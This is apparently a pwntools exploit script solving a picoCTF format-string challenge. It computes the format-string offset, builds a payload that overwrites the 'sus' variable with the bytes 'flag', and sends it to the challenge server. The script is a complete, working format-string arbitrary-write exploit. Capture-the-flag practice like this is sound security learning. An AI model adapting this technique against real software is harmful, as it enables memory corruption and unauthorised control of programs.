from pwn import *

context.log_level = "Error"

exe = "./vuln"
context.binary = elf = ELF(exe)


def start():
    return process(elf.path)


def exec_fmt(payload):
    p = start()
    p.sendline(payload)
    return p.recvall(timeout=1)


target = elf.sym.sus
print(hex(target))

fmt = FmtStr(exec_fmt)
offset = fmt.offset
print(offset)

writes = {target: 0x67616C66}
payload = fmtstr_payload(offset, writes, write_size="byte")

# io = process()
io = remote("rhea.picoctf.net", 61793)
io.sendline(payload)

io.interactive()
